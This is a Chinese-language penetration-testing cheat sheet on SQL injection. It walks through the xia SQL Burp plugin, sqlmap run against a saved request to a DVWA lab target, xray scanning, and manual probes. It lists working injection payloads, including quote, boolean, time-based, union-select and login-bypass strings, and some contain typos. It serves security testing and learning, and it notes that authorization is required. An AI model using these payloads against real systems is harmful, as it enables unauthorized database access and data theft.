注入 SQL 语句, 访问数据库.

若测试未授权的 Web  列出所有数据库即可, 得到授权后再深入测试.

SQL 注入可能存在的位置

```
登录框
检索
页面详情
Cookie
需要调用后端功能的 API
```

## 1 xia SQL

将 HTTP history 中可能存在 SQL 注入的数据包发送到 xia SQL

![将 HTTP history 中可能存在 SQL 注入的数据包发送到 xia SQL](./../../../../images/SQL%20%E6%B3%A8%E5%85%A5/%E5%B0%86%20HTTP%20history%20%E4%B8%AD%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%20SQL%20%E6%B3%A8%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E5%8F%91%E9%80%81%E5%88%B0%20xia%20SQL.png)

xia SQL 会自动检测是否有疑似 SQL 注入漏洞的存在

![xia SQL 会自动检测是否有疑似 SQL 注入的漏洞存在](./../../../../images/SQL%20%E6%B3%A8%E5%85%A5/xia%20SQL%20%E4%BC%9A%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E6%9C%89%E7%96%91%E4%BC%BC%20SQL%20%E6%B3%A8%E5%85%A5%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8.png)

## 2 Sqlmap

将疑似存在 SQL 注入漏洞的数据包保存到 `FileName.txt` ,

```shell
┌──(root㉿kali)-[~]
└─# vim FileName.txt
```

```http
GET /dvwa/vulnerabilities/brute/?password=456&Login=Login&username=123 HTTP/1.1
Host: debian.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Referer: http://debian.local/dvwa/vulnerabilities/brute/?username=123&password=123&Login=Login
Cookie: security=low; PHPSESSID=5p1cn67mc1u9bl81502vilbepm
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

 使用 Sqlmap 爆破数据库

```shell
┌──(root㉿kali)-[~]
└─# sqlmap --beep --batch --level 5 --risk 2 --random-agent -r /Path/FileName.txt --dbs
```

## 3 xray

直接使用 Chrome 代理到 xray 被动扫描

```powershell
PS C:\Users\sec> xray webscan --listen 127.0.0.1:7777 --html-output scan.html
```

扫描出 SQL 注入漏洞后使用 ChatGPT 判断报告中 Payload 的类型, 然后在 Google 查找同类型的 Payload 手动注入

## ==未归纳==

## 手动

验证 sql 注入的方法

```
id=1' 
id=1"
> 看是否报错
id=1/1
id=1/0
> 看是否有不同（数据包，响应时间）
```

```
id=1' and '1' ='1
id=1' and 1=1#
id=1' and 1=1-- 
id=1' and 1=1--+
id=1' waitfor delay '0:0:5'--+
id=1' union select 1,@@VERSION,3--+

0%27XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR%27Z
若存在 SQL 注入则睡眠 3 秒
```

判断 sql 查询类型

```
id=1'||(seletc '')||'
id=1'||(seletc '' from dual)||'
```

在 SQL 查询中，`OR` 运算符具有短路求值的逻辑。这使得在查询中加入恒为真的条件（如 `1=1`）会使得整个 `WHERE` 子句总为真，从而返回所有记录。

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1
```

登录框处的 sql 注入

```
SELECT * FROM users WHERE username = 'administrator'--+' AND password = ''
```

## 扫描器

sqlmap 在可使用 -r test.txt 对数据包进行注入（可测登录时的数据包）

